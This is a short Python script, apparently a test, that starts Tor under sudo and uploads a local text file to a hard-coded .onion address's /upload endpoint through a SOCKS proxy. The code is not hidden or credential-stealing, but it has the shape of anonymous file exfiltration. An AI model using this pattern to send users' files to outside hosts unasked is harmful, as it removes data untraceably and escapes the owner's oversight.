import subprocess
import signal
import os
import requests
import time

ONION_ADDR = "uiarfeveadqaj3frrwlqomhgoywfdlujhw65jnzsyku7oqdlz4rwwnyd.onion"
TORRC_PATH = "/etc/tor/torrc"

def main():
    process = subprocess.Popen(("sudo", "-u", "debian-tor", "tor", "-f", TORRC_PATH))
    print("Waiting for Tor to bootstrap...")
    time.sleep(10)  # pour laisser le temps à Tor de se connecter

    proxies = {
        "http":  "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    }

    with open("../chunk_8997e82e.txt", "rb") as f:
        files = {"file": ("test.txt", f)}
        url = f"http://{ONION_ADDR}/upload"
        resp = requests.post(url, files=files, proxies=proxies, timeout=60)
        print("Server response:", resp.json())
    process.send_signal(signal.SIGINT)
    print("Tor stopped.")

if __name__ == "__main__":
    main()

